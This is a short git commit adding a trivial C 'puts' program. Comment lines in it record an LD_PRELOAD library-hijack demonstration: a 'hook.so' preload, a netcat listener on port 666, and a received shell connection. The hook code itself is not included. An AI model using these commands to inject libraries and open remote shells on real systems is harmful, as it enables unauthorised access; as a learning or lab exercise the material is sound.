eb406bcb6f788f1630a27b7f4522587d561def52
x67sv <64111097+x67sv@users.noreply.github.com>
2021-08-31 03:00:13 +0300

    Create puts.c

---
+++ puts.c
@@ -0,0 +1,16 @@
+#include <stdio.h>
+int main() {
+puts("F");
+}
+
+# gcc puts.c -o puts
+
+# export LD_PRELOAD="/home/x67sv/hook.so"
+
+#nc -lvp 666
+  
+#./puts
+
+
+#Connection received on localhost 59353
+#$
